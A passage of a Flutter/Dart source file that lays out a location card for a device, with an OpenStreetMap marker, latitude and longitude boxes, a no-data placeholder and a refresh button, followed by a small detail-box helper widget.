                            urlTemplate:
                                'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
                            userAgentPackageName: 'com.example.app',
                          ),
                          MarkerLayer(
                            markers: [
                              Marker(
                                point: LatLng(
                                    _lastLocation!['latitude'] ?? 0,
                                    _lastLocation!['longitude'] ?? 0),
                                width: 40,
                                height: 40,
                                child: const Icon(
                                  Icons.location_on,
                                  color: Colors.red,
                                  size: 40,
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: _buildLocDetail(
                          'Latitude',
                          _lastLocation!['latitude'].toStringAsFixed(6),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: _buildLocDetail(
                          'Longitude',
                          _lastLocation!['longitude'].toStringAsFixed(6),
                        ),
                      ),
                    ],
                  ),
                ] else ...[
                  Center(
                    child: Column(
                      children: [
                        Icon(Icons.location_off,
                            size: 40, color: _softGrey.withOpacity(0.5)),
                        const SizedBox(height: 8),
                        Text(
                          'No location data',
                          style: TextStyle(
                            color: _softGrey,
                            fontSize: 12,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
                const SizedBox(height: 12),
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: isOnline
                        ? () => _fetchLocation(deviceId)
                        : null,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.blue,
                      foregroundColor: _primaryWhite,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                    child: _isLoadingData
                        ? const SizedBox(
                            height: 20,
                            width: 20,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              valueColor: AlwaysStoppedAnimation<Color>(
                                  _primaryWhite),
                            ),
                          )
                        : const Text('REFRESH LOCATION'),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLocDetail(String label, String value) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _cardDark,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.blue.withOpacity(0.2), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            label,
            style: TextStyle(
              color: _softGrey,
              fontSize: 10,
              fontWeight: FontWeight.w500,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            value,
            style: const TextStyle(
              color: _primaryWhite,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }
}
